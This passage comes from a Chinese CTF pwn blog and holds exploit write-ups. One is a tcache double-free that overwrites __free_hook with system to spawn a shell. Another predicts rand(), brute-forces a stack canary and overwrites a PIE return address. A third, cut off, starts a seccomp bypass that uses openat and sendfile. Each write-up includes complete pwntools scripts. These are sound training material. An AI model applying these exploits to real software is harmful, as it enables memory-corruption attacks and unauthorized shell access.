class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        call(); <span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jack Ma doesn&#x27;t like you~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类似形成一个结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line">    Chunk* chunk;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202526933.bmp"></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202709261.bmp"></p><h2 id="call-free"><a href="#call-free" class="headerlink" title="call(free)"></a>call(free)</h2><ul><li><strong>很明显的uaf漏洞</strong></li></ul><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202720899.bmp"></p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><ul><li>漏洞点很明显，有uaf漏洞，free掉的指针没有清零</li><li>先malloc(0x410) 绕过tcache进入unsorted bin，然后直接show就可以泄露libc，也可以malloc(0x80)，然后free8次，再show也是可以的，是因为此题目没有double free检查</li><li>然后double free改free_hook为system，就差不多了，跟之前一样的步骤</li></ul><h1 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h1><h2 id="绕过tcache-泄露libc"><a href="#绕过tcache-泄露libc" class="headerlink" title="绕过tcache+泄露libc"></a>绕过tcache+泄露libc</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>先malloc(0x410)（＞0x408）绕过tcache，后面两个malloc是为了修改free_hook和最后的getshell</li><li>free(chunk0)之后,如下，此时fd和bk指向的是<strong>main_arena+96，而不是88了</strong></li></ul><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922205929434.bmp"></p><ul><li>由于此时的指针没有清零，可以直接show，泄露libc</li></ul><h2 id="double-free-getshell"><a href="#double-free-getshell" class="headerlink" title="double free+getshell"></a>double free+getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># glibc2.30才有的double free的检查</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"># 此时 tcache bin 中 1 -&gt; 1</span><br><span class="line">add(0x20,p64(free_hook),b&#x27;1&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbb&#x27;,b&#x27;1&#x27;)</span><br><span class="line">add(0x20,p64(system),b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>double free之后：</li></ul><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922210438537.bmp"></p><ul><li><font color="red">第一次add:</font></li></ul><p>修改了tcache bin中chunk的fd指针，指向__free_hook,只需要两次malloc就可以malloc到free_hook,进行修改</p><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211627712.bmp"></p><ul><li><font color="red">第二次add(无用的chunk):</font></li></ul><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211649330.bmp"></p><ul><li><font color="red">第三次add:</font></li></ul><p>可以看到__free_hook指向了system，调用free-&gt;free_hook-&gt;system</p><p><img src="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922212154845.bmp"></p><ul><li>最后直接free(2)即可，相当于system(“&#x2F;bin&#x2F;sh”)</li></ul><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26786)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Chunk&#123;</span></span><br><span class="line"><span class="string">    Chunk* chunk;</span></span><br><span class="line"><span class="string">    int size;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,call</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input compary call:\n&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># glibc2.30才有的double free的检查</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache bin 中 1 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪随机+爆破canary+爆破PIE</title>
      <link href="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/"/>
      <url>/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/</url>
      
        <content type="html"><![CDATA[<h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color="red">题目来自：basectf</font></p><p><font color="red">题解参考：<a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">官方wp</a></font></p><h1 id="checksec-ida速览"><a href="#checksec-ida速览" class="headerlink" title="checksec+ida速览"></a>checksec+ida速览</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">Arch:       amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line"><span class="comment">// 保护全开，注意PIE</span></span><br></pre></td></tr></table></figure><p><img src="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150140743.bmp"></p><ul><li><p>第一个红框，伪随机数的绕过，只要libc一致，时间一致，算法一致，所产生的随机数也是一样的。</p></li><li><p>第二个红框fork创建子进程，虽然创建子进程是从头开始，但是canary是不变的，这里可以爆破canary</p></li><li><p>第三个红框是核心函数，可以用来爆破canary和栈溢出到shell函数。</p></li></ul><p><img src="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150603492.bmp"></p><p><img src="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150659629.bmp"></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>第一步肯定是绕过伪随机数，这里用到python中的ctypes库，先用本地的libc演示：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="comment"># 本地libc</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>) <span class="comment"># 时间种子，0代表本地时间</span></span><br><span class="line">libc.srand(seed) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">srand 搭配 rand</span></span><br><span class="line"><span class="string">srandom 搭配 random</span></span><br><span class="line"><span class="string">前者安全性差</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>第二步就是爆破canary，canary最后一字节肯定是\x00，所以还需要爆破七位，因此因套两层循环，注意每一次都需要模拟随机数：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i) <span class="comment"># 单字节爆破</span></span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev: <span class="comment"># 一位出错立马stack_chk_fail</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>位是<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第<span class="number">1</span>位是<span class="number">0xeb</span></span><br><span class="line">第<span class="number">2</span>位是<span class="number">0x9</span></span><br><span class="line">第<span class="number">3</span>位是<span class="number">0x27</span></span><br><span class="line">第<span class="number">4</span>位是<span class="number">0xbe</span></span><br><span class="line">第<span class="number">5</span>位是<span class="number">0xab</span></span><br><span class="line">第<span class="number">6</span>位是<span class="number">0x48</span></span><br><span class="line">第<span class="number">7</span>位是<span class="number">0xde</span></span><br><span class="line">canary <span class="keyword">is</span> <span class="number">0xde48abbe2709eb00</span></span><br></pre></td></tr></table></figure><ul><li>canary到手了，只需要将返回地址后<strong>两字节改为shell的地址</strong>，但是要注意并不是返回到push rbp的位置，因为那样程序是跑不通的，无法获得flag，所以我们直接往下面这个地址跳就行了：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000012A9 ; __unwind &#123;</span><br><span class="line">.text:00000000000012A9                 endbr64</span><br><span class="line">.text:00000000000012AD                 push    rbp</span><br><span class="line">.text:00000000000012AE                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012B1  往这里写即可     lea     rdi, command    ; &quot;/bin/cat flag&quot;</span><br><span class="line">.text:00000000000012B8                 call    _system</span><br><span class="line">.text:00000000000012BD                 nop</span><br><span class="line">.text:00000000000012BE                 pop     rbp</span><br><span class="line">.text:00000000000012BF                 retn</span><br><span class="line">.text:00000000000012BF ; &#125; // starts at 12A9</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆破pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell) <span class="comment"># 注意是p16</span></span><br><span class="line">    <span class="comment"># 只需要改末尾两字节就可以了</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><ul><li>注意：本地复现要创建一个flag文件</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;challenge.basectf.fun&quot;,32079)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf1 = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1 = cdll.LoadLibrary(&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">seed = elf1.time(<span class="number">0</span>)</span><br><span class="line">elf1.srand(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破canary    </span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="comment">#rev = p.recv()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;第<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>位是<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沙箱禁用ORW-BaseCTF</title>
      <link href="/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/"/>
      <url>/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="典型的沙箱禁用"><a href="#典型的沙箱禁用" class="headerlink" title="典型的沙箱禁用"></a>典型的沙箱禁用</h1><p><a href="https://www.basectf.fun/games/1/challenges">题目链接</a></p><p><a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">题解链接</a></p><p><a href="https://blog.csdn.net/SUKI547/article/details/103315487">linux64位系统调用表</a></p><p><a href="http://downbeat.top/2024/09/01/pwnable%E7%B3%BB%E5%88%97/">未禁用ORW</a></p><h1 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your shellcode:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sandbox(); <span class="comment">// 沙箱禁用</span></span><br><span class="line">  execute_shellcode(buf);</span><br><span class="line">  munmap(buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>其实挺明显的，我们只要绕过沙箱的限制即可，下面看看沙箱禁用了什么：</li></ul><p><img src="/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/capture_20240918210028982.bmp"></p><ul><li><font color="red" size="4">禁用ORW</font></li></ul><h1 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h1><ul><li>按照开头题解出题人的思路来的，先用openat打开flag文件，接着用sendfile输出flag</li><li>对于这两个函数的解释如下(引自gpt)</li></ul><h3 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h3><ul><li><code>openat</code> 函数是 Linux 系统调用的一部分，用来打开一个相对于目录文件描述符的文件。在文件系统操作中，<code>openat</code> 提供了一种灵活的方式，允许你在一个指定的目录（而不是当前工作目录）内打开文件。<code>openat</code> 的作用和 <code>open</code> 类似，但 <code>openat</code> 允许指定一个文件描述符（目录的文件描述符），以便于处理相对路径的文件。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span></span>;</span><br><span class="line">dirfd: 表示目录的文件描述符。如果是 AT_FDCWD，则相对路径是从当前工作目录开始查找。</span><br><span class="line">pathname: 要打开的文件路径,例如<span class="string">&quot;/flag&quot;</span>。</span><br><span class="line">flags: 文件打开的标志，类似于 open 的标志，如 O_RDONLY、O_WRONLY、O_RDWR、O_CREAT 等。</span><br><span class="line">mode: 新文件的权限，仅当使用 O_CREAT 时才需要。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汇编代码如下：</span><br><span class="line">openat 函数</span><br><span class="line">mov rax, 257          ; 系统调用号 (openat)</span><br><span class="line">mov rdi, dirfd        ; 目录文件描述符</span><br><span class="line">mov rsi, pathname     ; 文件路径</span><br><span class="line">mov rdx, flags        ; 文件打开标志</span><br><span class="line">mov r10, mode         ; 文件权限 (当使用 O_CREAT 时)</span><br><span class="line">syscall               ; 执行系统调用</span><br></pre></td></tr></table></figure><h3 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h3><ul><li><code>sendfile</code> 是 Linux 的系统调用，用于在两个文件描述符之间传输数据。它在内核中直接进行文件数据的传输，避免了数据从内核到用户空间的拷贝，从而提高了性能。常用于网络服务器中，将文件内容快速发送到网络套接字</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br><span class="line">out_fd: 目标文件描述符，通常是一个套接字文件描述符（socket），表示将数据发送到哪里。</span><br><span class="line">in_fd: 源文件描述符，表示从哪里读取数据，通常是一个普通的文件。</span><br><span class="line">offset: 指向偏移量的指针，表示从源文件的哪个位置开始读取。如果为 <span class="literal">NULL</span>，则从当前偏移量开始读取。</span><br><span class="line">count: 需要传输的字节数。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 40          ; 系统调用号 (sendfile)</span><br><span class="line">mov rdi, out_fd      ; 目标文件描述符</span><br><span class="line">mov rsi, in_fd       ; 源文件描述符</span><br><span class="line">mov rdx, offset      ; 文件偏移量指针</span><br><span class="line">mov r10, count       ; 传输的字节数</span><br><span class="line">syscall              ; 执行系统调用</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><ul><li>openat</li></ul><figure 